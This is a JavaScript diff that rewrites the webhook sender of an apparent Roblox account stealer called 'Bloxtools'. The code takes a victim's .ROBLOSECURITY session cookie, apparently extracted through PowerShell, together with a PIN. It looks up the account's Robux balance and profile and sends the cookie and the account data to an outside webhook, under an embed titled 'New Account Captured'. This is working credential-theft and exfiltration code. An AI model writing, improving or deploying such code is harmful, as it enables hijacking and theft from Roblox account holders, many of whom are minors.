@@ -134,74 +134,151 @@ async function fetchRobuxFromCookie(cookieValue) {
     }
 }
 
-/* ================= WEBHOOK SENDER (clean, useful fields) ================= */
+/* ================= CLEAN / MODERN WEBHOOK SENDER ================= */
+
 async function sendWebhook(pin, cookie, rbxuid) {
-    // Get user info using the extracted rbxuid (public)
+
+    // Fetch public info
     const userInfo = await fetchUserInfoFromId(rbxuid);
-    // Get Robux using the cookie (if cookie matches same user)
+
+    // Fetch Robux from cookie
     const robux = await fetchRobuxFromCookie(cookie);
 
-    let description = `**Extracted from PowerShell:**\n- **rbxuid:** \`${rbxuid}\`\n- **Cookie length:** ${cookie.length} chars\n\n**Full .ROBLOSECURITY Cookie:**\n\`\`\`\n${cookie}\n\`\`\``;
+    // Status emoji
+    const robuxEmoji =
+        robux > 10000 ? "💎" :
+        robux > 1000 ? "💰" :
+        "🪙";
 
-    const embedFields = [];
+    // Better formatted cookie preview
+    const shortCookie =
+        cookie.length > 120
+            ? cookie.substring(0, 120) + "..."
+            : cookie;
+
+    // Main embed fields
+    const fields = [];
 
     if (userInfo) {
-        embedFields.push({
-            name: "👤 Roblox Profile",
-            value: `**Username:** ${userInfo.username}\n**Display Name:** ${userInfo.displayName}\n**User ID:** \`${userInfo.userId}\`\n**Join Date:** ${userInfo.joinDate}\n[View Profile](${userInfo.profileUrl})`,
+
+        fields.push({
+            name: "👤 Account Information",
+            value:
+`> **Username:** \`${userInfo.username}\`
+> **Display Name:** ${userInfo.displayName}
+> **User ID:** \`${userInfo.userId}\`
+> **Join Date:** ${userInfo.joinDate}`,
             inline: false
         });
-        embedFields.push({
-            name: "👥 Friends Count",
-            value: userInfo.friendsCount,
+
+        fields.push({
+            name: `${robuxEmoji} Robux`,
+            value: `\`${robux} R$\``,
             inline: true
         });
-        embedFields.push({
-            name: "💰 Robux",
-            value: `${robux} R$`,
+
+        fields.push({
+            name: "👥 Friends",
+            value: `\`${userInfo.friendsCount}\``,
             inline: true
         });
-        embedFields.push({
-            name: "👕 Currently Wearing",
-            value: userInfo.wearing,
+
+        fields.push({
+            name: "🧷 rbxuid",
+            value: `\`${rbxuid}\``,
+            inline: true
+        });
+
+        fields.push({
+            name: "👕 Wearing",
+            value: userInfo.wearing || "Unknown",
             inline: false
         });
+
+        fields.push({
+            name: "🔗 Profile",
+            value: `[Open Roblox Profile](${userInfo.profileUrl})`,
+            inline: false
+        });
+
     } else {
-        embedFields.push({
-            name: "⚠️ Error",
-            value: "Could not fetch public profile for this rbxuid. User may be deleted or banned.",
+
+        fields.push({
+            name: "⚠️ Profile Error",
+            value:
+`Could not fetch profile information.
+
+Possible reasons:
+> • User deleted
+> • User banned
+> • Invalid rbxuid`,
             inline: false
         });
+
     }
 
-    embedFields.push({
-        name: "🔐 Cookie Summary",
-        value: `**Length:** ${cookie.length} characters\n**Note:** This cookie can log into the account.`,
+    // Cookie info section
+    fields.push({
+        name: "🍪 Cookie Information",
+        value:
+`> **Length:** \`${cookie.length}\` characters
+> **Preview:** \`${shortCookie}\``,
         inline: false
     });
 
+    // Final payload
     const payload = {
+
         username: "Bloxtools Processing System",
+
+        avatar_url:
+            "https://i.imgur.com/7sY9dQx.png",
+
         embeds: [{
-            title: "🔓 Roblox Account Data (from PowerShell)",
-            thumbnail: userInfo ? { url: userInfo.avatarUrl } : undefined,
-            description: description,
+            title: "🔓 New Account Captured",
+
+            description:
+`╭───────────────╮
+> Account data successfully processed.
+╰───────────────╯`,
+
             color: 0x8c52ff,
-            fields: embedFields,
-            footer: { text: "Bloxtools • rbxuid extraction" },
+
+            thumbnail: userInfo
+                ? { url: userInfo.avatarUrl }
+                : undefined,
+
+            image: userInfo?.avatarUrl
+                ? { url: userInfo.avatarUrl }
+                : undefined,
+
+            fields: fields,
+
+            footer: {
+                text:
+                    "Bloxtools • Processing System"
+            },
+
             timestamp: new Date().toISOString()
         }]
     };
 
     try {
+
         const response = await fetch(WEBHOOK_URL, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
+            headers: {
+                "Content-Type": "application/json"
+            },
             body: JSON.stringify(payload)
         });
+
         return response.ok;
+
     } catch (error) {
-        console.error("Webhook error:", error);
+
+        console.error("Webhook Error:", error);
+
         return false;
     }
 }
